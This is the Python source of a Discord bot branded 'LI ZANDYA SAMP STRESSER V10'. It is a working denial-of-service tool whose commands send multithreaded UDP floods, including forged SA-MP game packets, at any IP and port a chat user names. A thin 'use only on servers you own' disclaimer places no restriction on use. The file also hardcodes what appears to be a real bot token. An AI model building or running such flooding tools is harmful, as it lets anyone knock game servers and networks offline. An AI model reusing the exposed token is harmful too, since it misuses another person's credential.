#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE SAMP STRESSER V10 ⚡
# 🔥 COMMAND: .samp IP PORT DURATION 🔥
# ⚠️ USE ONLY ON SERVERS YOU OWN! ⚠️

import discord
from discord.ext import commands
import asyncio
import random
import socket
import struct
import time
import os
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================
# التوكن - ضع التوكن الجديد هنا
# ============================================
TOKEN = "MTQ5NzI0NjQxMDY0OTg5NTA1Mg.GbTNbr.TK9ernnRI8EJ5Ij45CsRgWeMyKOSCvjYeKG2Zo"

# ============================================
# إعدادات القوة القصوى
# ============================================
CPU_CORES = os.cpu_count() or 4
MAX_THREADS = min(CPU_CORES * 500, 2000)
PACKET_SIZE = 4096
BUFFER_SIZE = 1024 * 1024 * 10

# ============================================
# تخزين بيانات المستخدمين
# ============================================
active_users = {}  # {user_id: {"start_time": time, "status": "active"}}
total_users = set()  # جميع المستخدمين الذين استخدموا البوت

print(f"""
╔══════════════════════════════════════════════════════════════╗
║     🔥 LI ZANDYA - ULTIMATE SAMP STRESSER V10 🔥            ║
╠══════════════════════════════════════════════════════════════╣
║ 💻 CPU: {CPU_CORES} Cores                                    ║
║ 🔥 Threads: {MAX_THREADS}                                   ║
║ 📝 Command: .samp IP PORT DURATION                          ║
║ 💀 Example: .samp 192.168.1.1 7777 60                       ║
║ ⚠️ USE ONLY ON SERVERS YOU OWN!                             ║
╚══════════════════════════════════════════════════════════════╝
""")

# ============================================
# نظام الهجوم المتطور
# ============================================
class SAMPStresser:
    def __init__(self):
        self.running = False
        self.active_attacks = {}
        self.executor = ThreadPoolExecutor(max_workers=MAX_THREADS)
        self.stats = {'total_packets': 0, 'total_attacks': 0, 'peak_speed': 0}
    
    async def attack_samp(self, ip, port, duration, user_id=None):
        self.running = True
        attack_id = f"{ip}:{port}"
        self.active_attacks[attack_id] = time.time()
        sent = 0
        bytes_sent = 0
        
        # تسجيل المستخدم
        if user_id:
            active_users[user_id] = {"start_time": time.time(), "status": "active", "target": f"{ip}:{port}"}
            total_users.add(user_id)
        
        def worker():
            nonlocal sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
                sock.setblocking(False)
                start = time.time()
                
                while self.running and time.time() - start < duration:
                    for _ in range(10):
                        # حزمة SAMP متطورة
                        packet = b'SAMP'
                        packet += struct.pack('<I', random.randint(1, 999999))
                        packet += b'\x80'
                        packet += struct.pack('<fffff', 
                            random.uniform(-5000,5000), random.uniform(-5000,5000),
                            random.uniform(-5000,5000), random.uniform(0,360), random.uniform(0,360))
                        packet += struct.pack('<I', random.randint(1,100))
                        packet += struct.pack('<I', 99999)
                        packet += os.urandom(random.randint(500, 2000))
                        
                        sock.sendto(packet, (ip, port))
                        sent += 1
                        bytes_sent += len(packet)
                        
                        # حزمة UDP عادية
                        udp_packet = os.urandom(random.randint(1024, 4096))
                        sock.sendto(udp_packet, (ip, port))
                        sent += 1
                        bytes_sent += len(udp_packet)
                        
                sock.close()
            except:
                pass
        
        workers = min(MAX_THREADS, 500)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass
        
        del self.active_attacks[attack_id]
        if user_id and user_id in active_users:
            del active_users[user_id]
        
        self.stats['total_packets'] += sent
        self.stats['total_attacks'] += 1
        
        rate = sent / duration
        mbps = (bytes_sent / duration) / 1024 / 1024
        if rate > self.stats['peak_speed']:
            self.stats['peak_speed'] = rate
        
        return sent, bytes_sent, rate, mbps
    
    async def attack_udp(self, ip, port, duration, user_id=None):
        self.running = True
        attack_id = f"UDP_{ip}:{port}"
        self.active_attacks[attack_id] = time.time()
        sent = 0
        bytes_sent = 0
        
        if user_id:
            active_users[user_id] = {"start_time": time.time(), "status": "active", "target": f"{ip}:{port}"}
            total_users.add(user_id)
        
        def udp_worker():
            nonlocal sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setblocking(False)
                start = time.time()
                while self.running and time.time() - start < duration:
                    pkt = os.urandom(random.randint(1024, 4096))
                    sock.sendto(pkt, (ip, port))
                    sent += 1
                    bytes_sent += len(pkt)
                sock.close()
            except:
                pass
        
        workers = min(MAX_THREADS, 300)
        futures = [self.executor.submit(udp_worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass
        
        del self.active_attacks[attack_id]
        if user_id and user_id in active_users:
            del active_users[user_id]
        
        self.stats['total_packets'] += sent
        self.stats['total_attacks'] += 1
        rate = sent / duration
        return sent, bytes_sent, rate
    
    async def attack_ultimate(self, ip, port, duration, user_id=None):
        self.running = True
        attack_id = f"ULTIMATE_{ip}:{port}"
        self.active_attacks[attack_id] = time.time()
        
        if user_id:
            active_users[user_id] = {"start_time": time.time(), "status": "active", "target": f"{ip}:{port}"}
            total_users.add(user_id)
        
        tasks = [
            self.attack_samp(ip, port, duration),
            self.attack_udp(ip, port, duration)
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        total_packets = 0
        total_bytes = 0
        for r in results:
            if isinstance(r, tuple) and len(r) > 0:
                total_packets += r[0] if isinstance(r[0], int) else 0
        
        del self.active_attacks[attack_id]
        if user_id and user_id in active_users:
            del active_users[user_id]
        
        self.stats['total_packets'] += total_packets
        self.stats['total_attacks'] += 1
        return total_packets, total_packets / duration
    
    def stop(self):
        self.running = False
        return True

stresser = SAMPStresser()

# ============================================
# البوت - أوامر بسيطة مع إحصائيات المستخدمين
# ============================================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║     ✅ LI ZANDYA SAMP STRESSER IS ONLINE! ✅                ║
╠══════════════════════════════════════════════════════════════╣
║ 🤖 Bot: {bot.user}                                           ║
║ 🔥 Threads: {MAX_THREADS}                                   ║
║ 👥 Total Users: {len(total_users)}                          ║
║ ⚡ Active Users: {len(active_users)}                        ║
║ 📝 Commands:                                                ║
║   .samp IP PORT DURATION  - SAMP attack                    ║
║   .udp IP PORT DURATION    - UDP attack                    ║
║   .ultimate IP PORT DURATION - Ultimate attack             ║
║   .stats                   - Show statistics               ║
║   .active                  - Show active attacks           ║
║   .profile                 - Show user profile             ║
║   .stop                    - Stop all attacks              ║
╚══════════════════════════════════════════════════════════════╝
    """)

@bot.command()
async def samp(ctx, ip: str, port: int, duration: int):
    """هجوم SAMP - استخدم على سيرفرك فقط"""
    await ctx.send(f"💀 **SAMP ATTACK STARTED**\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s")
    start = time.time()
    packets, bytes_sent, rate, mbps = await stresser.attack_samp(ip, port, duration, ctx.author.id)
    elapsed = time.time() - start
    await ctx.send(f"✅ **SAMP ATTACK COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n📊 Bandwidth: {mbps:.2f} Mbps")

@bot.command()
async def udp(ctx, ip: str, port: int, duration: int):
    """هجوم UDP - استخدم على سيرفرك فقط"""
    await ctx.send(f"💀 **UDP ATTACK STARTED**\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s")
    packets, bytes_sent, rate = await stresser.attack_udp(ip, port, duration, ctx.author.id)
    mbps = (bytes_sent / duration) / 1024 / 1024
    await ctx.send(f"✅ **UDP ATTACK COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n📊 Bandwidth: {mbps:.2f} Mbps")

@bot.command()
async def ultimate(ctx, ip: str, port: int, duration: int):
    """الهجوم النهائي - جميع الأنواع معاً"""
    await ctx.send(f"💀 **ULTIMATE ATTACK STARTED**\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s")
    packets, rate = await stresser.attack_ultimate(ip, port, duration, ctx.author.id)
    await ctx.send(f"✅ **ULTIMATE ATTACK COMPLETE!**\n📦 Total Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps")

@bot.command()
async def stats(ctx):
    """إحصائيات البوت"""
    active = len(active_users)
    embed = discord.Embed(title="📊 STRESSER STATISTICS", color=0xFFD700)
    embed.add_field(name="📦 Total Packets", value=f"{stresser.stats['total_packets']:,}", inline=True)
    embed.add_field(name="🎯 Total Attacks", value=f"{stresser.stats['total_attacks']}", inline=True)
    embed.add_field(name="⚡ Active Attacks", value=f"{active}", inline=True)
    embed.add_field(name="🏆 Peak Speed", value=f"{stresser.stats['peak_speed']:,.0f} pps", inline=True)
    embed.add_field(name="👥 Total Users", value=f"{len(total_users)}", inline=True)
    embed.add_field(name="🔧 Threads", value=f"{MAX_THREADS}", inline=True)
    embed.add_field(name="💻 CPU", value=f"{CPU_CORES} Cores", inline=True)
    await ctx.send(embed=embed)

@bot.command()
async def active(ctx):
    """عرض الهجمات النشطة"""
    if not active_users:
        await ctx.send("🟢 No active attacks.")
        return
    
    active_list = ""
    for user_id, info in list(active_users.items())[:10]:
        user = await bot.fetch_user(user_id)
        elapsed = time.time() - info['start_time']
        active_list += f"• {user.name}: {info['target']} | {elapsed:.0f}s\n"
    
    embed = discord.Embed(title="🔥 ACTIVE ATTACKS", description=f"```{active_list}```", color=0xFF6600)
    embed.set_footer(text=f"Total Active: {len(active_users)}")
    await ctx.send(embed=embed)

@bot.command()
async def profile(ctx):
    """عرض بروفايل المستخدم"""
    user_id = ctx.author.id
    user = ctx.author
    
    # حساب عدد الهجمات التي قام بها المستخدم
    user_attacks = 0  # يمكن تطويره لحفظ عدد هجمات كل مستخدم
    
    is_active = user_id in active_users
    
    embed = discord.Embed(title=f"👤 {user.name}'s PROFILE", color=0x00FF00)
    embed.set_thumbnail(url=user.avatar.url if user.avatar else None)
    embed.add_field(name="🆔 ID", value=f"`{user_id}`", inline=True)
    embed.add_field(name="📅 Joined", value=f"<t:{int(user.created_at.timestamp())}:R>", inline=True)
    embed.add_field(name="⚡ Active Now", value="✅ Yes" if is_active else "❌ No", inline=True)
    embed.add_field(name="💀 Total Attacks", value=f"{user_attacks}", inline=True)
    embed.add_field(name="👥 Total Bot Users", value=f"{len(total_users)}", inline=True)
    embed.add_field(name="🔥 Active Users", value=f"{len(active_users)}", inline=True)
    
    if is_active:
        target = active_users[user_id]['target']
        elapsed = time.time() - active_users[user_id]['start_time']
        embed.add_field(name="🎯 Current Target", value=f"`{target}`", inline=True)
        embed.add_field(name="⏱️ Duration", value=f"{elapsed:.0f}s", inline=True)
    
    await ctx.send(embed=embed)

@bot.command()
async def stop(ctx):
    """إيقاف جميع الهجمات"""
    stresser.running = False
    active_users.clear()
    await ctx.send("⏹️ **ALL ATTACKS STOPPED!**")

@bot.command()
async def users(ctx):
    """عرض عدد المستخدمين الذين يشغلون البوت"""
    embed = discord.Embed(title="👥 BOT USER STATISTICS", color=0x00BFFF)
    embed.add_field(name="📊 Total Users", value=f"`{len(total_users)}`", inline=True)
    embed.add_field(name="⚡ Active Users", value=f"`{len(active_users)}`", inline=True)
    embed.add_field(name="💤 Inactive Users", value=f"`{len(total_users) - len(active_users)}`", inline=True)
    embed.set_footer(text="LI ZANDYA C2 SYSTEM V10")
    await ctx.send(embed=embed)

if __name__ == "__main__":
    print("Starting LI ZANDYA SAMP STRESSER V10...")
    bot.run(TOKEN)
